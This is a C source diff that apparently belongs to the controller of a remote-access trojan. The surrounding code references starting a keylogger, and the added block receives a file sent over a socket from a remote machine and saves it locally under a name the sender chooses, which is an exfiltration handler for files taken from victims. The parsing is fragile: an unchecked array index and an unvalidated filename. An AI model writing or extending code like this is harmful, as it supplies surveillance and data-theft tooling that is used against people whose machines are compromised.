@@ -1,4 +1,7 @@
 #include "status.h"
+#include "str_cut.h"
+
+#include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -85,6 +88,47 @@ int main()
       info("Starting keylogger...");
       continue;
     }
+    if (strncmp("cf ", buffer, 3) == 0)
+    {
+      warning("NOTE: Please be aware of some formatting issues.");
+      info("Receiving file...");
+      recv(client_socket, response, sizeof(response), 0);
+
+      // Split response by ":"
+      // sprintf(rspns, "file:%d:%s:%s", filesize, filename, file_contents);
+      char *parts[4];
+      int i = 0;
+      char *token = strtok(response, ":");
+      while (token != NULL)
+      {
+        parts[i++] = token;
+        token = strtok(NULL, ":");
+      }
+
+      // Get file size
+      int filesize = atoi(parts[1]);
+
+      // Get file name
+      char *filename = parts[2];
+
+      // Get file contents
+      char *file_contents = parts[3];
+
+      info("\nFile information:");
+      printf("\tFile size: %d\n", filesize);
+      printf("\tFile name: %s\n", filename);
+
+      // Create file
+      FILE *file = fopen(filename, "wb");
+
+      // Write file contents
+      fwrite(file_contents, sizeof(char), filesize, file);
+
+      success("Saved file successfully.\n");
+
+      // Close file
+      fclose(file);
+    }
     else
     {
       recv(client_socket, response, sizeof(response), 0); // No need for MSG_WAITALL on Windows
@@ -94,3 +138,6 @@ int main()
 
   return 0;
 }
+
+/*
+ */
